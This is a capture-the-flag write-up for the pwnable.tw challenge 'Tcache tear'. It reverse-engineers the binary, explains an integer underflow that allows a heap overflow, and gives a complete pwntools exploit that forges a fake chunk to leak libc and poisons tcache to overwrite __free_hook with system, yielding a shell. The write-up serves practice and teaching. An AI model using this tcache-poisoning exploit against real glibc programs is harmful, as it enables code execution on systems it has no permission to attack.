---
date: '2025-08-29T09:53:43+07:00'
draft: false
title: 'Tcache tear (200 pts) - pwnable.tw'
# cover:
#     image: img/debruyne.jpg
#     alt: 'wait a minute'
tags: ["pwnable.tw"]
---

## 0x1. Initial Reconnaissance

### file
```
↪ file tcache_tear
tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped
```

### checksec
```
↪ checksec --file=tcache_tear
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	Partial	1		2		tcache_tear
```

### ./tcache_tear
```
Name:YourName
$$$$$$$$$$$$$$$$$$$$$$$
      Tcache tear     
$$$$$$$$$$$$$$$$$$$$$$$
  1. Malloc            
  2. Free              
  3. Info              
  4. Exit              
$$$$$$$$$$$$$$$$$$$$$$$
Your choice :
```


## 0x2. Reverse Engineering

### main
```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  __int64 v3; // rax
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  sub_400948();
  printf("Name:");
  sub_400A25((__int64)&unk_602060, 0x20u);
  v4 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      sub_400A9C();
      v3 = sub_4009C4();
      if ( v3 != 2 )
        break;
      if ( v4 <= 7 )
      {
        free(ptr);
        ++v4;
      }
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        sub_400B99();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_14;
      sub_400B14();
    }
  }
}
```

### Allocate
```c
int sub_400B14()
{
  unsigned __int64 v0; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  v0 = sub_4009C4();
  size = v0;
  if ( v0 <= 0xFF )
  {
    ptr = malloc(v0);
    printf("Data:");
    sub_400A25((__int64)ptr, size - 16);
    LODWORD(v0) = puts("Done !");
  }
  return v0;
}
```

### read_function
```c
_BYTE *__fastcall sub_400A25(__int64 a1, unsigned int a2)
{
  _BYTE *result; // rax
  int chk; // [rsp+1Ch] [rbp-4h]

  chk = __read_chk(0LL, a1, a2, a2);
  if ( chk <= 0 )
  {
    puts("read error");
    _exit(1);
  }
  result = (_BYTE *)*(unsigned __int8 *)(chk - 1LL + a1);
  if ( (_BYTE)result == 10 )
  {
    result = (_BYTE *)(chk - 1LL + a1);
    *result = 0;
  }
  return result;
}
```

### Info
```c
ssize_t sub_400B99()
{
  printf("Name :");
  return write(1, &unk_602060, 0x20uLL);
}
```

## 0x3. Analysis

First, you can write your name (up to 32 bytes) to name variable in bss (at 0x602060). You can also print out what's in this variable with info option. They allow us to malloc a chunk of our desired size (as long as smaller than 0xff) and input our size-16 to these chunk, then store the address to ptr variable (at 0x602088). Free option enables us to free chunk stored at ptr variable but not reset it.


## 0x4. Exploit

If you allocate a chunk of 15 bytes, the program mistakenly lets you input -1 bytes into it — which actually means you can write up to 0xff bytes. Using this, you can create two chunks, with the first one being 15 bytes. After freeing both chunks, allocate another 15-byte chunk to reclaim the first one. Since you can now write 0xff bytes into it, you can overflow into the second chunk and overwrite its fd pointer, paving the way for exploitation. 
Because you can print value at name variable, so what will happen if you make this variable become a fake chunk ?
If you forge the size of this fake chunk to greater than 0x411 then free it, they will put your fake chunk into large bins or unsorted bin. This means you can get the address of main arena through info option.
But when you try to exploit, you could encounter 2 errors below:
#### "double free or corruption (!prev)"

```c
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      malloc_printerr ("double free or corruption (!prev)");
```

They check whether the next chunk does have prev_inuse bit on or not. But you create a fake chunk in bss, you have no next chunk. To bypass, just need to create another chunk right after your fake chunk.

#### "corrupted size vs. prev_size"

If you free a large chunk (exceeds the fastbins and tcache range), lets call chunk A, they will check whether the next chunk (chunk B) is the top chunk or not. If chunk B isn't the top chunk, they continue to validate whether chunk B is freed or not by checking the prev_inuse flag in the next chunk of chunk B. If chunk B is freed, they merge chunk B into chunk A.
```c
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");		
    ...
    ...   
}

...
...
_int_free (....){
    ...

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
        if (!nextinuse) {
	        unlink(av, nextchunk, bck, fwd);
	        size += nextsize;
        } else
    	    clear_inuse_bit_at_offset(nextchunk, 0);
    ...
    }
    ...
}
```

To bypass this errror, create 2 fake chunks right after your fake chunk at name variable.

After getting the address of main arena, when I try to create a chunk of 15 bytes, they return me the address of my fake chunk that I just freed. To handle that, I prepared 2 chunks and put them into tcache before freeing my fake chunk.


###### Exploit
```python
from pwn import *

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *0x400BC7")
    else:
        r = remote("chall.pwnable.tw", 10207)

    return r

def allocate (p, size, data):
    p.sendlineafter (b'Your choice :', b'1')
    p.sendafter (b'Size:', size)
    p.sendafter (b'Data:', data)

def free (p):
    p.sendlineafter (b'Your choice :', b'2')

def info (p):
    p.sendlineafter (b'Your choice :', b'3')    

def main():
    p = conn()
    name = 0x602060
    ptr = 0x602088
    p.sendafter (b'Name:', p64 (0) + p64 (0x501))

    allocate (p, b'15', b'1')
    free(p)
    allocate (p, b'81', b'12')
    free(p)

    allocate (p, b'15', b'A' * 16 + p64 (0) + p64 (0x61) + p64 (name + 0x500))
    allocate (p, b'81', b'123')
    allocate (p, b'81', p64 (0) + p64 (0x21) + p64 (0) * 3 + p64 (0x21))

    
    allocate (p, b'15', b'12345')
    free(p)
    allocate (p, b'70', b'123456')
    free(p)

    allocate (p, b'15', b'A' * 16 + p64 (0) + p64 (0x51) + p64 (name + 16))
    allocate (p, b'70', b'1234567')
    
    print ("This is for later exlpoit ####################################################################################################3")    
    allocate (p, b'15', b'12345')
    free(p)
    allocate (p, b'50', b'123456')
    free(p)
    
    allocate (p, b'70', b'12345678')
    free(p)
    info(p)
    p.recvuntil (p64(0) + p64 (0x501))
    main_arena = u64 (p.recv(8))
    libc.address = main_arena - 0x3ebca0
    print ('The address of main_arena is : ', hex (main_arena))
    print ("The address of libc is : ", hex (libc.address))

    


    allocate (p, b'15', b'A' * 16 + p64 (0) + p64 (0x41) + p64 (libc.symbols['__free_hook']))
    allocate (p, b'50', b'1234567')
    allocate (p, b'50', p64 (libc.symbols['system']))

    allocate (p, b'30', b'/bin/sh\x00')
    free(p)

    p.interactive()


if __name__ == "__main__":
    main()
```

